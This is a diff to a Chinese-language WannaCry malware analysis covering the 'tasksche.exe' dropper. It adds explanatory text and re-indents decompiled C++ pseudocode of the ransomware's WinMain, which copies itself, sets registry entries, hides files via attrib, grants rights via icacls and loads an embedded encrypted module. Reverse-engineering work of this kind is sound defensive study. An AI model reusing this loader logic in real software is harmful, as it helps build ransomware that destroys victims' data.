@@ -13,60 +13,64 @@ The attack started on Friday, 12 May 2017, and within a day was reported to have
 
 **tasksche** 
 
-Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。
+Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。 下面我们来一起来分析一下这个程序，从WinMain函数开始。
 
-```C++
-int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
-{
-  char **argv; // eax@2
-  void *lpPEFile; // eax@10
-  CPeBuilder *pPeBuilder; // eax@11
-  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); // eax@12
-  CProgram Program; // [sp+10h] [bp-6E4h]@9
-  char szModuleFileName[520]; // [sp+4E8h] [bp-20Ch]@1
-  int nFileSize; // [sp+6F0h] [bp-4h]@10
 
-  szModuleFileName[0] = szSelfName;
-  memset(&szModuleFileName[1], 0, 516u);
-  *&szModuleFileName[517] = 0;
-  szModuleFileName[519] = 0;
-  GetModuleFileNameA(0, szModuleFileName, 520u);
-  CreateRandomSequence(szServiceName);
-  if ( *_p___argc() != 2
-    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
-    || !CreateHiddenData(0)
-    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
-    || !StartMalware() )
-  {
-    if ( strrchr(szModuleFileName, '\\') )
-      *strrchr(szModuleFileName, '\\') = 0;
-    SetCurrentDirectoryA(szModuleFileName);
-    WriteRegistery(1);
-    ExtractFromResource(0, WNcry);
-    ModifyOneByte();
-    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
-    StartProcess(aIcacls_GrantEv, 0, 0);
-    if ( InitKernel32Funcs() )
-    {
-      CProgram::ctor(&Program);
-      if ( CProgram::Initialize(&Program, 0, 0, 0) )
-      {
-        nFileSize = 0;
-        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
-        if ( lpPEFile )
-        {
-          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
-          if ( pPeBuilder )
-          {
-            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
-            if ( fpTaskStart )
-              fpTaskStart(0, 0);
-          }
-        }
-      }
-      CProgram::dtor_0(&Program);
-    }
-  }
-  return 0;
-}
-```
+> 为了容易说明程序的行为，以下的代码片段将全部使用C++语言来表述，除非碰到C++表达混乱或者因编译器优化等原因导致C++无法表达的情况下，会采用汇编语言并加详细说明。
+
+	```C++
+	int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+	{
+	  char **argv; // eax@2
+	  void *lpPEFile; // eax@10
+	  CPeBuilder *pPeBuilder; // eax@11
+	  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); // eax@12
+	  CProgram Program; // [sp+10h] [bp-6E4h]@9
+	  char szModuleFileName[520]; // [sp+4E8h] [bp-20Ch]@1
+	  int nFileSize; // [sp+6F0h] [bp-4h]@10
+	
+	  szModuleFileName[0] = szSelfName;
+	  memset(&szModuleFileName[1], 0, 516u);
+	  *&szModuleFileName[517] = 0;
+	  szModuleFileName[519] = 0;
+	  GetModuleFileNameA(0, szModuleFileName, 520u);
+	  CreateRandomSequence(szServiceName);
+	  if ( *_p___argc() != 2
+	    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
+	    || !CreateHiddenData(0)
+	    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
+	    || !StartMalware() )
+	  {
+	    if ( strrchr(szModuleFileName, '\\') )
+	      *strrchr(szModuleFileName, '\\') = 0;
+	    SetCurrentDirectoryA(szModuleFileName);
+	    WriteRegistery(1);
+	    ExtractFromResource(0, WNcry);
+	    ModifyOneByte();
+	    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
+	    StartProcess(aIcacls_GrantEv, 0, 0);
+	    if ( InitKernel32Funcs() )
+	    {
+	      CProgram::ctor(&Program);
+	      if ( CProgram::Initialize(&Program, 0, 0, 0) )
+	      {
+	        nFileSize = 0;
+	        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
+	        if ( lpPEFile )
+	        {
+	          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
+	          if ( pPeBuilder )
+	          {
+	            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
+	            if ( fpTaskStart )
+	              fpTaskStart(0, 0);
+	          }
+	        }
+	      }
+	      CProgram::dtor_0(&Program);
+	    }
+	  }
+	  return 0;
+	}
+	```
+
